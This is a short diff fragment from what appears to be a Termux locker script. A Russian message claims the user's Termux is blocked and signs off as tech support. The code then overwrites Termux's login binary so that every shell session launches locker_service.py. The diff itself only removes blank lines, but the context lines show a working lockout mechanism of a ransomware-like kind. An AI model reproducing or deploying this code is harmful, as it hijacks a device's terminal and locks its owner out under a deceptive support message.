@@ -52,5 +52,3 @@ print('Ваш Termux заблокирован.\n © Тех.поддержка и
 file = open('/data/data/com.termux/files/usr/bin/login', 'w')
 file.write('python /data/data/com.termux/files/usr/bin/locker_service.py')
 file.close()
-
- 
